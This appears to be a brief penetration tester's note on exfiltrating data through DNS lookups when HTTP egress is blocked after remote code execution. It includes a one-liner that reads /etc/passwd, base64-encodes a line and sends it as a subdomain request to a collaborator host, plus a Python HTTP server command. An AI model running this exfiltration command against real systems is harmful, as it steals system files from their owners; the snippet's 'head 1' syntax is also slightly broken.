# Exfiltration
Tags: #dns #firewall #waf
Related to: [[DNS]]
See also:
Previous:

## Links

## Notes
### DNS exfiltration when HTTP blocked
If you are able to do RCE on a target but can't exfil over HTTP:
- read content from file
- Use head to get a line
- b64 encode
- Make a DNS request to collaborator or a server you control
`EXFIL=$(cat /etc/passwd | head 1 | base64); curl $EXFIL.collaborator.com`

### Python simple server
`python3 -m http.server 1337`